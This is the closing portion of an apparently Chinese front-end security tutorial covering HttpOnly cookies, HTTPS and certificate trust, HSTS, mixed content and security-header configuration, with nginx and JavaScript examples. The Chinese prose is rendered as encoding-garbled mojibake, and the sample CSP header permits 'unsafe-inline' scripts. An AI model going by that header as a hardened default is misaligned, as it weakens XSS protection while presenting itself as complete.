    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(key, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(item));
  },

  <span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>) {
    <span class="hljs-keyword">const</span> itemStr = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(key);
    <span class="hljs-keyword">if</span> (!itemStr) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

    <span class="hljs-keyword">const</span> item = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(itemStr);
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() &gt; item.<span class="hljs-property">expiry</span>) {
      <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(key);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    <span class="hljs-keyword">return</span> item.<span class="hljs-property">value</span>;
  },

  <span class="hljs-title function_">remove</span>(<span class="hljs-params">key</span>) {
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(key);
  }
};

<span class="hljs-comment">// ä½¿ç”¨</span>
secureStorage.<span class="hljs-title function_">set</span>(<span class="hljs-string">'tempData'</span>, { <span class="hljs-attr">foo</span>: <span class="hljs-string">'bar'</span> }, <span class="hljs-number">60000</span>);  <span class="hljs-comment">// 1 åˆ†é’Ÿè¿‡æœŸ</span>
<span class="hljs-keyword">const</span> data = secureStorage.<span class="hljs-title function_">get</span>(<span class="hljs-string">'tempData'</span>);
</code></pre>
<h3 data-id="heading-19">æ¨èæ–¹æ¡ˆ</h3>
<p>è®¤è¯ token ä¼˜å…ˆè€ƒè™‘ <strong>HttpOnly Cookie</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åç«¯è®¾ç½®</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'auth_token'</span>, token, {
  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// JavaScript è®¿é—®ä¸åˆ°</span>
  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,        <span class="hljs-comment">// åªåœ¨ HTTPS ä¸‹å‘é€</span>
  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span>,  <span class="hljs-comment">// é˜² CSRF</span>
  <span class="hljs-attr">maxAge</span>: <span class="hljs-number">3600000</span>      <span class="hljs-comment">// 1 å°æ—¶è¿‡æœŸ</span>
});

<span class="hljs-comment">// å‰ç«¯å‘è¯·æ±‚æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¸¦ä¸Š cookie</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/user/profile'</span>, {
  <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>
});
</code></pre>
<p>è¿™æ ·å³ä½¿æœ‰ XSS æ¼æ´ï¼Œæ”»å‡»è€…ä¹Ÿæ‹¿ä¸åˆ° tokenã€‚</p>
<h3 data-id="heading-20">IndexedDB å’Œ Web SQL</h3>
<p>å®ƒä»¬ä¹Ÿæœ‰åŒæ ·çš„é—®é¢˜ï¼ŒJavaScript å¯ä»¥å®Œå…¨è®¿é—®ã€‚ä¸è¦ç”¨æ¥å­˜æ•æ„Ÿæ•°æ®ã€‚</p>
<hr/>
<h2 data-id="heading-21">HTTPSï¼šä¼ è¾“å®‰å…¨çš„åŸºç¡€</h2>
<p>HTTP æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œä¸­é—´äººèƒ½çœ‹åˆ°å’Œä¿®æ”¹æ‰€æœ‰å†…å®¹ã€‚HTTPS ç”¨ TLS/SSL åŠ å¯†ï¼Œæä¾›ä¸‰ä¸ªä¿éšœï¼š</p>
<ol>
<li><strong>å†…å®¹åŠ å¯†</strong>ï¼šä¸­é—´äººçœ‹ä¸åˆ°ä¼ è¾“å†…å®¹</li>
<li><strong>èº«ä»½è®¤è¯</strong>ï¼šç¡®ä¿è®¿é—®çš„æ˜¯çœŸæ­£çš„æœåŠ¡å™¨ï¼Œä¸æ˜¯ä¸­é—´äººä¼ªé€ çš„</li>
<li><strong>æ•°æ®å®Œæ•´æ€§</strong>ï¼šé˜²æ­¢å†…å®¹è¢«ç¯¡æ”¹</li>
</ol>
<h3 data-id="heading-22">HTTPS å·¥ä½œåŸç†</h3>
<p>HTTPS ç”¨çš„æ˜¯æ··åˆåŠ å¯†ï¼š<strong>éå¯¹ç§°åŠ å¯† + å¯¹ç§°åŠ å¯†</strong>ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆä¸å…¨ç”¨éå¯¹ç§°åŠ å¯†ï¼Ÿ</strong></p>
<ul>
<li>éå¯¹ç§°åŠ å¯†å®‰å…¨ä½†æ…¢ï¼ˆRSA åŠ å¯†é€Ÿåº¦æ¯” AES æ…¢ 1000 å€ï¼‰</li>
<li>å¯¹ç§°åŠ å¯†å¿«ä½†ä¸å®‰å…¨ï¼ˆå¯†é’¥æ€ä¹ˆä¼ è¾“ï¼Ÿï¼‰</li>
</ul>
<p>æ‰€ä»¥ç»“åˆä¸¤è€…ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant å®¢æˆ·ç«¯
    participant æœåŠ¡å™¨

    rect rgb(200, 230, 255)
        Note over å®¢æˆ·ç«¯, æœåŠ¡å™¨: æ¡æ‰‹é˜¶æ®µï¼ˆéå¯¹ç§°åŠ å¯†ï¼‰
        å®¢æˆ·ç«¯-&gt;&gt;æœåŠ¡å™¨: 1. è¯·æ±‚HTTPSè¿æ¥
        æœåŠ¡å™¨-&gt;&gt;å®¢æˆ·ç«¯: 2. è¿”å›æ•°å­—è¯ä¹¦(å«å…¬é’¥)
        å®¢æˆ·ç«¯-&gt;&gt;å®¢æˆ·ç«¯: 3. éªŒè¯è¯ä¹¦åˆæ³•æ€§
        å®¢æˆ·ç«¯-&gt;&gt;æœåŠ¡å™¨: 4. ç”Ÿæˆå¯¹ç§°å¯†é’¥ï¼Œç”¨å…¬é’¥åŠ å¯†å‘é€
        æœåŠ¡å™¨-&gt;&gt;æœåŠ¡å™¨: 5. ç”¨ç§é’¥è§£å¯†ï¼Œè·å–å¯¹ç§°å¯†é’¥
    end

    rect rgb(200, 255, 200)
        Note over å®¢æˆ·ç«¯, æœåŠ¡å™¨: ä¼ è¾“é˜¶æ®µï¼ˆå¯¹ç§°åŠ å¯†ï¼‰
        å®¢æˆ·ç«¯-&gt;&gt;æœåŠ¡å™¨: 6. ç”¨å¯¹ç§°å¯†é’¥åŠ å¯†æ•°æ®
        æœåŠ¡å™¨-&gt;&gt;å®¢æˆ·ç«¯: 7. ç”¨å¯¹ç§°å¯†é’¥åŠ å¯†å“åº”
    end
</code></pre>
<ol>
<li>
<p><strong>æ¡æ‰‹é˜¶æ®µï¼ˆéå¯¹ç§°åŠ å¯†ï¼‰</strong>ï¼š</p>
<ul>
<li>å®¢æˆ·ç«¯è¯·æ±‚ HTTPS è¿æ¥</li>
<li>æœåŠ¡å™¨è¿”å›æ•°å­—è¯ä¹¦ï¼ˆåŒ…å«å…¬é’¥ï¼‰</li>
<li>å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦åˆæ³•æ€§</li>
<li>å®¢æˆ·ç«¯ç”Ÿæˆéšæœºå¯¹ç§°å¯†é’¥ï¼Œç”¨æœåŠ¡å™¨å…¬é’¥åŠ å¯†åå‘é€</li>
<li>æœåŠ¡å™¨ç”¨ç§é’¥è§£å¯†ï¼Œæ‹¿åˆ°å¯¹ç§°å¯†é’¥</li>
</ul>
</li>
<li>
<p><strong>æ•°æ®ä¼ è¾“é˜¶æ®µï¼ˆå¯¹ç§°åŠ å¯†ï¼‰</strong>ï¼š</p>
<ul>
<li>åŒæ–¹ç”¨åå•†å¥½çš„å¯¹ç§°å¯†é’¥åŠ å¯†æ‰€æœ‰æ•°æ®</li>
<li>é€Ÿåº¦å¿«ï¼Œå®‰å…¨æ€§ä¹Ÿæœ‰ä¿éšœ</li>
</ul>
</li>
</ol>
<h3 data-id="heading-23">æ•°å­—è¯ä¹¦å¦‚ä½•é˜²æ­¢ä¸­é—´äººæ”»å‡»</h3>
<p>ä¸­é—´äººå¯èƒ½æ‹¦æˆªæœåŠ¡å™¨çš„å…¬é’¥ï¼Œæ›¿æ¢æˆè‡ªå·±çš„ã€‚æ•°å­—è¯ä¹¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>
<p><strong>è¯ä¹¦åŒ…å«</strong>ï¼š</p>
<ul>
<li>æœåŠ¡å™¨å…¬é’¥</li>
<li>åŸŸåä¿¡æ¯</li>
<li>è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰çš„æ•°å­—ç­¾å</li>
</ul>
</li>
<li>
<p><strong>éªŒè¯æµç¨‹</strong>ï¼š</p>
<ul>
<li>æµè§ˆå™¨ç”¨ CA çš„å…¬é’¥éªŒè¯æ•°å­—ç­¾å</li>
<li>CA çš„å…¬é’¥å†…ç½®åœ¨æ“ä½œç³»ç»Ÿ/æµè§ˆå™¨ä¸­</li>
<li>å¦‚æœç­¾åéªŒè¯å¤±è´¥ï¼Œè¯´æ˜è¯ä¹¦è¢«ç¯¡æ”¹</li>
</ul>
</li>
<li>
<p><strong>ä¿¡ä»»é“¾</strong>ï¼š</p>
<ul>
<li>æ ¹ CAï¼ˆå—ä¿¡ä»»çš„æƒå¨æœºæ„ï¼‰</li>
<li>ä¸­é—´ CA</li>
<li>æœåŠ¡å™¨è¯ä¹¦</li>
</ul>
</li>
</ol>
<p>ä¸­é—´äººå³ä½¿æ‹¦æˆªå¹¶æ›¿æ¢è¯ä¹¦ï¼Œä¹Ÿæ— æ³•ä¼ªé€  CA çš„ç­¾åï¼Œæµè§ˆå™¨ä¼šæŠ¥è­¦å‘Šã€‚</p>
<h3 data-id="heading-24">å‰ç«¯è¦æ³¨æ„çš„</h3>
<p><strong>1. å¼ºåˆ¶ HTTPS</strong></p>
<p>é…ç½®é‡å®šå‘ï¼ŒHTTP è‡ªåŠ¨è·³ HTTPSï¼š</p>
<pre><code class="hljs language-nginx" lang="nginx">server {
  listen 80;
  server_name example.com;
  return 301 https://$server_name$request_uri;
}

server {
  listen 443 ssl http2;
  server_name example.com;

  ssl_certificate /path/to/cert.pem;
  ssl_certificate_key /path/to/key.pem;

  # ç°ä»£ SSL é…ç½®
  ssl_protocols TLSv1.2 TLSv1.3;
  ssl_ciphers HIGH:!aNULL:!MD5;
  ssl_prefer_server_ciphers on;
}
</code></pre>
<p><strong>2. HSTSï¼ˆHTTP Strict Transport Securityï¼‰</strong></p>
<p>å‘Šè¯‰æµè§ˆå™¨ä»¥ååªç”¨ HTTPS è®¿é—®ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">Strict-Transport-Security: <span class="hljs-attr">max-age</span>=<span class="hljs-number">31536000</span><span class="hljs-comment">; includeSubDomains; preload</span>
</code></pre>
<ul>
<li><code>max-age=31536000</code>ï¼š1 å¹´å†…å¼ºåˆ¶ HTTPS</li>
<li><code>includeSubDomains</code>ï¼šåŒ…æ‹¬æ‰€æœ‰å­åŸŸå</li>
<li><code>preload</code>ï¼šåŠ å…¥æµè§ˆå™¨é¢„åŠ è½½åˆ—è¡¨ï¼ˆå» hstspreload.org æäº¤ï¼‰</li>
</ul>
<p>è®¾ç½® HSTS åï¼Œå³ä½¿ç”¨æˆ·è¾“å…¥ <code>http://example.com</code>ï¼Œæµè§ˆå™¨ä¹Ÿä¼šè‡ªåŠ¨æ”¹æˆ <code>https://</code>ã€‚</p>
<p><strong>3. é¿å…æ··åˆå†…å®¹ï¼ˆMixed Contentï¼‰</strong></p>
<p>HTTPS é¡µé¢é‡Œä¸è¦åŠ è½½ HTTP èµ„æºï¼Œå¦åˆ™æµè§ˆå™¨ä¼šè­¦å‘Šæˆ–é˜»æ­¢ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- å±é™© --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://example.com/script.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://cdn.example.com/image.jpg"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- å®‰å…¨ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://example.com/script.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.example.com/image.jpg"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- åè®®ç›¸å¯¹è·¯å¾„ï¼ˆè‡ªåŠ¨åŒ¹é…å½“å‰é¡µé¢åè®®ï¼‰ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"//example.com/script.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>æ£€æŸ¥æ··åˆå†…å®¹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ£€æµ‹é¡µé¢æ˜¯å¦æœ‰æ··åˆå†…å®¹</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">URL</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'https'</span>));

<span class="hljs-comment">// ç›‘å¬æ··åˆå†…å®¹è­¦å‘Š</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'securitypolicyviolation'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'Mixed content:'</span>, e);
});
</code></pre>
<p><strong>4. è¯ä¹¦æœ‰æ•ˆæœŸ</strong></p>
<p>è®°å¾—ç»­æœŸè¯ä¹¦ã€‚å¯ä»¥ç”¨ Let's Encrypt å…è´¹è¯ä¹¦ï¼Œé…åˆ certbot è‡ªåŠ¨ç»­æœŸï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£… certbot</span>
apt-get install certbot python3-certbot-nginx

<span class="hljs-comment"># è·å–è¯ä¹¦</span>
certbot --nginx -d example.com

<span class="hljs-comment"># è‡ªåŠ¨ç»­æœŸï¼ˆcron jobï¼‰</span>
0 0 * * * certbot renew --quiet
</code></pre>
<hr/>
<h2 data-id="heading-25">å®‰å…¨ HTTP å“åº”å¤´æ¸…å•</h2>
<p>é™¤äº†å‰é¢æåˆ°çš„ CSPã€X-Frame-Optionsã€HSTSï¼Œè¿˜æœ‰å‡ ä¸ªé‡è¦çš„å®‰å…¨å¤´ï¼š</p>
<h3 data-id="heading-26">1. X-Content-Type-Options</h3>
<p>ç¦æ­¢æµè§ˆå™¨ MIME ç±»å‹å—…æ¢ï¼š</p>
<pre><code class="hljs language-css" lang="css">X-<span class="hljs-attribute">Content</span>-Type-Options: nosniff
</code></pre>
<p>é˜²æ­¢æµè§ˆå™¨æŠŠ <code>text/plain</code> æ–‡ä»¶å½“ JavaScript æ‰§è¡Œã€‚</p>
<h3 data-id="heading-27">2. Referrer-Policy</h3>
<p>æ§åˆ¶ Referer å¤´æ³„éœ²å¤šå°‘ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">Referrer<span class="hljs-operator">-</span>Policy: strict<span class="hljs-operator">-</span>origin<span class="hljs-operator">-</span><span class="hljs-keyword">when</span><span class="hljs-operator">-</span><span class="hljs-keyword">cross</span><span class="hljs-operator">-</span>origin
</code></pre>
<p>å¯é€‰å€¼ï¼š</p>
<ul>
<li><code>no-referrer</code>ï¼šä¸å‘é€</li>
<li><code>no-referrer-when-downgrade</code>ï¼šHTTPSâ†’HTTP ä¸å‘é€</li>
<li><code>origin</code>ï¼šåªå‘é€åŸŸå</li>
<li><code>strict-origin-when-cross-origin</code>ï¼šè·¨åŸŸåªå‘é€åŸŸåï¼ˆæ¨èï¼‰</li>
</ul>
<h3 data-id="heading-28">3. Permissions-Policy</h3>
<p>é™åˆ¶æµè§ˆå™¨åŠŸèƒ½ï¼ˆåŸ Feature-Policyï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">Permissions-Policy: <span class="hljs-attr">geolocation</span>=(), microphone=(), camera=(), payment=()
</code></pre>
<p>ç¦æ­¢é¡µé¢è®¿é—®æ‘„åƒå¤´ã€éº¦å…‹é£ã€åœ°ç†ä½ç½®ç­‰ã€‚</p>
<h3 data-id="heading-29">4. X-XSS-Protectionï¼ˆå·²è¿‡æ—¶ï¼‰</h3>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">X-XSS-Protection: 0</span>
</code></pre>
<p>è¿™ä¸ªå¤´å·²ç»è¿‡æ—¶äº†ï¼Œç°ä»£æµè§ˆå™¨ä¸å†æ¨èä½¿ç”¨ã€‚ç”¨ CSP ä»£æ›¿ã€‚</p>
<h3 data-id="heading-30">å®Œæ•´é…ç½®ç¤ºä¾‹</h3>
<pre><code class="hljs language-nginx" lang="nginx"># Nginx é…ç½®
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'self'" always;
</code></pre>
<h3 data-id="heading-31">æ£€æµ‹å·¥å…·</h3>
<p>ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fsecurityheaders.com" target="_blank" title="https://securityheaders.com" ref="nofollow noopener noreferrer">securityheaders.com</a> æ£€æµ‹ä½ çš„ç½‘ç«™ç¼ºå°‘å“ªäº›å®‰å…¨å¤´ï¼Œä¼šç»™å‡ºè¯„åˆ†å’Œæ”¹è¿›å»ºè®®ã€‚</p>
<hr/>
<h2 data-id="heading-32">å°ç»“</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">mindmap
  root((å‰ç«¯å®‰å…¨))
    è¾“å…¥å®‰å…¨
      XSSé˜²å¾¡
        è½¬ä¹‰è¾“å‡º
        textContent
        DOMPurify
        CSP
      éªŒè¯è¿‡æ»¤
    è¯·æ±‚å®‰å…¨
      CSRFé˜²å¾¡
        Token
        SameSite Cookie
      CORSé…ç½®
        ç™½åå•
        é™åˆ¶æ–¹æ³•
    ä¼ è¾“å®‰å…¨
      HTTPS
      HSTS
      è¯ä¹¦ç®¡ç†
    å­˜å‚¨å®‰å…¨
      HttpOnly Cookie
      é¿å…localStorageå­˜æ•æ„Ÿæ•°æ®
    ä¾èµ–å®‰å…¨
      ç‰ˆæœ¬é”å®š
      npm audit
      ç§æœ‰æº
</code></pre>
<p>å‰ç«¯å®‰å…¨çš„æ ¸å¿ƒæ€è·¯ï¼š</p>
<ol>
<li><strong>ä¸ä¿¡ä»»ä»»ä½•è¾“å…¥</strong>ï¼šç”¨æˆ·è¾“å…¥ã€URL å‚æ•°ã€ç¬¬ä¸‰æ–¹æ•°æ®ï¼Œéƒ½è¦éªŒè¯å’Œè½¬ä¹‰</li>
<li><strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼šCookie è®¾ç½® HttpOnlyã€Secureã€SameSiteï¼›CSP é™åˆ¶èµ„æºåŠ è½½ï¼›CORS ç™½åå•</li>
<li><strong>çºµæ·±é˜²å¾¡</strong>ï¼šä¸è¦ä¾èµ–å•ä¸€é˜²æŠ¤æ‰‹æ®µï¼Œå¤šå±‚é˜²æŠ¤å åŠ </li>
<li><strong>ä¿æŒæ›´æ–°</strong>ï¼šä¾èµ–ç‰ˆæœ¬ã€å®‰å…¨è¡¥ä¸ã€æµè§ˆå™¨æ–°ç‰¹æ€§</li>
</ol>
<p>å…·ä½“æªæ–½é€ŸæŸ¥ï¼š</p>
<ul>
<li><strong>XSS é˜²å¾¡</strong>ï¼šç”¨ <code>textContent</code>ã€è½¬ä¹‰ HTMLã€DOMPurifyã€HttpOnly Cookieã€CSP</li>
<li><strong>CSRF é˜²å¾¡</strong>ï¼šCSRF Tokenã€SameSite Cookieã€éªŒè¯è¯·æ±‚æ¥æº</li>
<li><strong>ç‚¹å‡»åŠ«æŒé˜²å¾¡</strong>ï¼šX-Frame-Optionsã€CSP frame-ancestorsã€SameSite Cookie</li>
<li><strong>CORS å®‰å…¨</strong>ï¼šç™½åå•éªŒè¯ Originï¼Œä¸åŠ¨æ€åå°„ï¼Œé™åˆ¶æ–¹æ³•å’Œå¤´</li>
<li><strong>ä¾èµ–å®‰å…¨</strong>ï¼šé”å®šç‰ˆæœ¬ã€npm ciã€å®šæœŸå®¡è®¡ã€ç¦ç”¨è„šæœ¬ã€ç§æœ‰æºã€å‡å°‘ä¾èµ–</li>
<li><strong>å­˜å‚¨å®‰å…¨</strong>ï¼šä¸å­˜æ•æ„Ÿæ•°æ®åˆ° localStorageï¼Œç”¨ HttpOnly Cookieï¼Œå®ç°è¿‡æœŸæœºåˆ¶</li>
<li><strong>ä¼ è¾“å®‰å…¨</strong>ï¼šå¼ºåˆ¶ HTTPSã€HSTSã€é¿å…æ··åˆå†…å®¹ã€Let's Encrypt è‡ªåŠ¨ç»­æœŸ</li>
<li><strong>HTTP å¤´</strong>ï¼šCSPã€X-Frame-Optionsã€HSTSã€X-Content-Type-Optionsã€Referrer-Policyã€Permissions-Policy</li>
</ul>
<p>å®‰å…¨æ˜¯ä¸ªæŒç»­çš„è¿‡ç¨‹ï¼Œä¸æ˜¯ä¸€åŠ³æ°¸é€¸çš„äº‹ã€‚å®šæœŸå®¡è®¡ä»£ç ã€æ›´æ–°ä¾èµ–ã€å…³æ³¨å®‰å…¨å…¬å‘Šï¼Œæ‰èƒ½æŒç»­ä¿éšœç³»ç»Ÿå®‰å…¨ã€‚</p>
<hr/>
<p>å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œä»£ç ç¤ºä¾‹éƒ½ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">code-review-skill</a> è¿‡äº†ä¸€éã€‚è¿™æ˜¯æˆ‘å†™çš„ Claude Code ä»£ç å®¡æŸ¥æŠ€èƒ½ï¼Œèƒ½è‡ªåŠ¨æ£€æµ‹è¿™ç¯‡æ–‡ç« é‡Œæåˆ°çš„ XSSã€CSRFã€ä¸å®‰å…¨çš„ localStorage ä½¿ç”¨è¿™äº›é—®é¢˜ã€‚</p>
<p>ä¸»è¦åŠŸèƒ½ï¼š</p>
<ul>
<li><strong>å®‰å…¨æ¼æ´æ£€æµ‹</strong>ï¼šXSSã€CSRFã€æ³¨å…¥æ”»å‡»ã€æ•æ„Ÿæ•°æ®æš´éœ²</li>
<li><strong>æ¡†æ¶é€‚é…</strong>ï¼šReactã€Vueã€TypeScriptã€Node.js éƒ½èƒ½ç”¨</li>
<li><strong>æœ€ä½³å®è·µæ£€æŸ¥</strong>ï¼šä»£ç è§„èŒƒã€æ€§èƒ½é—®é¢˜ã€å¯ç»´æŠ¤æ€§</li>
</ul>
<p>ç”¨ Claude Code çš„è¯ç›´æ¥è£…ä¸Šå°±èƒ½ç”¨ï¼Œreview ä»£ç çš„æ—¶å€™çœä¸å°‘äº‹ã€‚ä»“åº“é‡Œæœ‰è¯¦ç»†çš„å®‰è£…è¯´æ˜å’Œä½¿ç”¨ç¤ºä¾‹ã€‚</p>
<p><strong>GitHub</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">tt-a1i/code-review-skill</a></p>
<p>è§‰å¾—æœ‰ç”¨çš„è¯ç»™ä¸ª starï¼Œæœ‰é—®é¢˜æ¬¢è¿æ issueã€‚</p>
<hr/>
<h2 data-id="heading-33">å‚è€ƒèµ„æ–™</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fowasp.org%2FTop10%2F2025%2F0x00_2025-Introduction%2F" target="_blank" title="https://owasp.org/Top10/2025/0x00_2025-Introduction/" ref="nofollow noopener noreferrer">OWASP Top 10:2025</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FCross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" title="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" ref="nofollow noopener noreferrer">OWASP XSS Prevention Cheat Sheet</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FCross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" title="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" ref="nofollow noopener noreferrer">OWASP CSRF Prevention Cheat Sheet</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTTP%2FGuides%2FCSP" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP" ref="nofollow noopener noreferrer">Content Security Policy - MDN</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FContent_Security_Policy_Cheat_Sheet.html" target="_blank" title="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html" ref="nofollow noopener noreferrer">OWASP CSP Cheat Sheet</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FSecurity%2FPractical_implementation_guides%2FCSRF_prevention" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/CSRF_prevention" ref="nofollow noopener noreferrer">MDN - CSRF Prevention</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FSecurity%2FPractical_implementation_guides%2FClickjacking" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Clickjacking" ref="nofollow noopener noreferrer">MDN - Clickjacking Prevention</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fportswigger.net%2Fweb-security%2Fcors" target="_blank" title="https://portswigger.net/web-security/cors" ref="nofollow noopener noreferrer">PortSwigger - CORS Security</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F599242750" target="_blank" title="https://zhuanlan.zhihu.com/p/599242750" ref="nofollow noopener noreferrer">npm å®‰å…¨ï¼šé˜²æ­¢ä¾›åº”é“¾æ”»å‡»</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2019%2F09%2Fcookie-samesite.html" target="_blank" title="https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html" ref="nofollow noopener noreferrer">SameSite Cookie å±æ€§</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.wosign.com%2FNews%2Fhttpsjiami_20180817.htm" target="_blank" title="https://www.wosign.com/News/httpsjiami_20180817.htm" ref="nofollow noopener noreferrer">HTTPS åŠ å¯†åŸç†</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fexlink2012%2Farticle%2Fdetails%2F147940289" target="_blank" title="https://blog.csdn.net/exlink2012/article/details/147940289" ref="nofollow noopener noreferrer">å‰ç«¯å®‰å…¨ï¼šXSSã€CSRF é˜²å¾¡ä¸æœ€ä½³å®è·µ</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>